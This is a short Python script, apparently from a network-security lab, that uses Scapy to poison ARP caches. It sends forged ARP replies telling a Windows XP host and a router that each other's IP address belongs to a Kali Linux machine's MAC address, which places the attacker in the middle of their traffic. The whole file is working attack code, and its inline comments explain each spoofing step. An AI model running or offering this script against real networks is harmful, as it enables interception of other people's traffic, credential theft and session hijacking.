from scapy.all import *

ext_rtr = "10.10.111.1"
windows_xp_ip = "10.10.111.108"
windows_xp_mac = "00:00:00:00:00:05"
kali_linux_mac = "00:00:00:00:00:04"
ext_rtr_mac = "00:00:00:00:00:03"

ethernet = Ether(src = kali_linux_mac, dst = windows_xp_mac)
arp = ARP(op=2, hwdst = windows_xp_mac, pdst = windows_xp_ip, psrc = ext_rtr)
packet = ethernet / arp
sendp(packet)#Tells to the Windows XP that it can reach ext-rtr using Kali's MAC address

ethernet2 = Ether(src = kali_linux_mac , dst = ext_rtr_mac)
arp2 = ARP(op=2, hwdst = ext_rtr_mac, pdst = ext_rtr, psrc = windows_xp_ip)
packet2 = ethernet2 / arp2
sendp(packet2) #Tells to the Ext-rtr that it can reach windows XP using Kali's MAC address

